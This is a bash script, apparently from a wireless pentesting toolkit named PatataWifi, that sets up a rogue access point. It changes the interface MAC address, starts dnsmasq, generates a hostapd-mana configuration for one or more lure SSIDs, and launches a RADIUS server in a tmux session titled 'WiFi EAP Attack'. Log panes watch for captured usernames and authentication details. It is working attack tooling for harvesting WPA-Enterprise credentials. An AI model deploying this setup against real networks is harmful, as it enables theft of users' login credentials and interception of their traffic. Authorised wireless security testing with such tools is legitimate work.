#!/bin/bash

MY_PATH="$(dirname "$0")"
MY_PATH="$(cd "${MY_PATH}" && pwd)"

cd ${MY_PATH}
iwconfig=/sbin/iwconfig
ifconfig=/sbin/ifconfig
macchanger=/usr/bin/macchanger
dnsmasq=/usr/sbin/dnsmasq

SESSION='PatataWifi_Default_Mana'

wlan_ap='wlan0'
mac='00:22:33:44:55:60' # Change me
channel=3

# SSID list, separated by space
ssid='test'

# WPA-EAP Management Network
mgmt_ssid='PatataWiFi_mgmt'
#mgmt_password='patatas333' # Not supported with mana

hostapdconf="${SESSION}.conf"
ip=172.31.0.1
netmask=255.255.255.0

radiusprofile="default"

logdir="${MY_PATH}/logs/${SESSION}"

# Wait for wlan interface
wlan_ap_active=$(${iwconfig} ${wlan_ap} 2>/dev/null)
while [ -z "${wlan_ap_active}" ]
do
  ((c++)) && ((c>10)) && echo "${wlan_ap} not found" && exit
  echo "waiting for ${wlan_ap}"
  sleep 1
  wlan_ap_active=$(${iwconfig} ${wlan_ap} 2>/dev/null)
done

# create log directory
mkdir -p -v ${logdir}
rm -v ${MY_PATH}/logs/current
ln -s ${logdir} ${MY_PATH}/logs/current
rm -v ${MY_PATH}/radiuscfg/current
ln -s ${MY_PATH}/radiuscfg/${radiusprofile} ${MY_PATH}/radiuscfg/current
echo "==> <==" >> ${logdir}/wpe.log

echo "[+] MAC change"
#mac1=$(ifconfig ${wlan_ap} |grep HWaddr| sed -E 's/.*HWaddr (.*)/\1/')
${ifconfig} ${wlan_ap} down
sleep 1
#ifconfig ${wlan_ap} hw ether ${mac}
#sleep 1
#ifconfig ${wlan_ap} up
${macchanger} -m ${mac} ${wlan_ap}
sleep 1

echo "[+] Setting IP  ${ip}  ${netmask}"
${ifconfig} ${wlan_ap} ${ip} netmask ${netmask}
${ifconfig} ${wlan_ap}
echo

echo "[+] DNSMASQ"
#service dnsmasq stop
#sleep 1
sed "s#\[INTERFACE\]#${wlan_ap}#g; s#\[PATH\]#${MY_PATH}#g" ${MY_PATH}/dnsmasq/dnsmasq.conf > ${MY_PATH}/dnsmasq/default.conf
${dnsmasq} -C ${MY_PATH}/dnsmasq/default.conf

echo "[+] HOSTAPD CONFIG"
sed "s/\[INTERFACE\]/${wlan_ap}/; s#\[MANALOG\]#${logdir}/mana.log#; s/\[MGMT_SSID\]/${mgmt_ssid}/; s/\[MGMT_PASSWORD\]/${mgmt_password}/; s/\[CHANNEL\]/${channel}/;" ${MY_PATH}/hostapd-mana/hostapd/patatawifi.conf > ${MY_PATH}/hostapd-mana/hostapd/${hostapdconf}
#Multiple SSID
wlan_virtual=1
for ssid2 in ${ssid}
  do sed "s/\[VIRTUALINTERFACE\]/${wlan_ap}_$((wlan_virtual++))/; s/\[SSID\]/${ssid2}/" ${MY_PATH}/hostapd-mana/hostapd/patatawifi-virtual.conf >> ${MY_PATH}/hostapd-mana/hostapd/${hostapdconf}
done

# Internet
#echo 1 > /proc/sys/net/ipv4/ip_forward
#iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

echo "[+] TMUX"
tmux -2 new-session -d -s $SESSION -n 'WiFi EAP Attack'
tmux split-window -v
tmux select-pane -t 0
tmux split-window -h
tmux select-pane -t 0
tmux send-keys "cd ${MY_PATH}/hostapd-mana/hostapd/; ./hostapd ${hostapdconf}" C-m
tmux select-pane -t 1
#tmux send-keys "radiusd -fXl ${logdir}/radius-debug.log -d ${MY_PATH}/radiuscfg/${radiusprofile} | tee -a ${logdir}/radius.log" C-m
tmux send-keys "radiusd -fl ${logdir}/radius-debug.log -d ${MY_PATH}/radiuscfg/${radiusprofile}" C-m
tmux select-pane -t 2
tmux resize-pane -U 10
touch ${logdir}/wpe.log
tmux send-keys "clear;tail -f -n 0 ${logdir}/wpe.log" C-m
tmux split-window -h
tmux select-pane -t 2
tmux split-window -h
touch ${logdir}/mana.log
tmux send-keys "clear;tail -f -n 0 ${logdir}/mana.log" C-m
tmux select-pane -t 4
touch ${logdir}/auth-detail
tmux send-keys "clear;tail -f -n 0 ${logdir}/auth-detail | grep \"Packet-Type\|User-Name\|Called\|Calling\|Sending\"" C-m

echo "Finished! Use 'tmux attach'"
exit 0
